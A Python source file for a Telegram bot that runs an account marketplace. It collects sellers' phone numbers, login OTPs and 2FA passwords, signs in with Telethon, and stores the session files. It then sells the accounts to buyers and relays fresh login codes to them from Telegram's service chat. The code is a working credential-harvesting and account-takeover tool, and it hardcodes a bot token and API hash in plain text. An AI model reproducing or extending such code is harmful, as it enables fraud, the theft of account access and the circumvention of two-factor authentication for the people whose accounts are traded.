import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
import time
import os

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'

bot = telebot.TeleBot(TOKEN)
active_clients = {} # Session storage for buyer/seller tasks

# --- DATABASE ---
db = {
    'users': {}, 
    'admins': [7634311488],
    'stock': [] # {'id': 'phone', 'price': 10, 'country': 'India'}
}

# --- HELPERS ---
def is_admin(uid): return uid in db['admins']

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('📲 Start Login', '💰 Balance', '📥 Deposit', '📤 Sell My ID')
    if is_admin(uid): markup.add('/admin')
    bot.send_message(message.chat.id, "🔥 Prime Automation Bot Active!", reply_markup=markup)

# --- AUTO-LOGIN SELLING SYSTEM ---
@bot.message_handler(func=lambda message: message.text == '📤 Sell My ID')
def sell_auto_start(message):
    msg = bot.send_message(message.chat.id, "📞 Sell karne wali ID ka number bhejein (+91...):")
    bot.register_next_step_handler(msg, sell_process_number)

def sell_process_number(message):
    phone = message.text.replace(" ", "")
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    active_clients[message.chat.id] = {'client': client, 'phone': phone}
    asyncio.run(sell_send_code(message.chat.id, phone, client))

async def sell_send_code(chat_id, phone, client):
    await client.connect()
    try:
        req = await client.send_code_request(phone)
        active_clients[chat_id]['hash'] = req.phone_code_hash
        msg = bot.send_message(chat_id, "📩 Seller, aapke number par OTP gaya hai, yahan likhein:")
        bot.register_next_step_handler(msg, sell_process_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def sell_process_otp(message):
    otp = message.text.strip()
    s = active_clients[message.chat.id]
    asyncio.run(sell_finish(message.chat.id, otp, s['client'], s['phone'], s['hash']))

async def sell_finish(chat_id, otp, client, phone, hash):
    try:
        await client.sign_in(phone, otp, phone_code_hash=hash)
        # Success - Add to stock
        db['stock'].append({'phone': phone, 'price': 20}) # Admin can change price later
        bot.send_message(chat_id, "✅ ID Login Successful! Admin check karke aapka balance add kar dega.")
        await client.disconnect()
    except SessionPasswordNeededError:
        msg = bot.send_message(chat_id, "🔐 2FA Password bhejo:")
        bot.register_next_step_handler(msg, sell_process_2fa)

def sell_process_2fa(message):
    pw = message.text.strip()
    client = active_clients[message.chat.id]['client']
    asyncio.run(client.sign_in(password=pw))
    bot.send_message(message.chat.id, "✅ 2FA Success! ID Stock mein hai.")

# --- BUYER PANEL (OTP & LOGOUT) ---
@bot.message_handler(func=lambda message: message.text == '📲 Start Login')
def buy_account(message):
    if not db['stock']: return bot.send_message(message.chat.id, "❌ Stock khali hai.")
    # Simple logic: first item in stock
    account = db['stock'].pop(0)
    phone = account['phone']
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Get Code Again", callback_data=f"getcode_{phone}"),
               types.InlineKeyboardButton("🚪 Logout Session", callback_data=f"logout_{phone}"))
    
    bot.send_message(message.chat.id, f"✅ Account Purchased!\n📱 Number: `{phone}`\n\nAb aap login karein, OTP chahiye ho toh niche button dabayein.", 
                     parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith(('getcode_', 'logout_')))
def handle_buyer_actions(call):
    action, phone = call.data.split('_')
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    
    if action == 'getcode':
        asyncio.run(fetch_last_otp(call.message.chat.id, client))
    elif action == 'logout':
        asyncio.run(terminate_session(call.message.chat.id, client, phone))

async def fetch_last_otp(chat_id, client):
    await client.connect()
    async for message in client.iter_messages(777000, limit=1):
        bot.send_message(chat_id, f"📩 Latest Telegram Code: `{message.text}`", parse_mode="Markdown")
    await client.disconnect()

async def terminate_session(chat_id, client, phone):
    await client.connect()
    await client.log_out()
    os.remove(f"sessions/{phone}.session")
    bot.send_message(chat_id, "🚪 Session Logged out and Deleted successfully!")

# Loop
while True:
    try: bot.polling(none_stop=True)
    except: time.sleep(5)
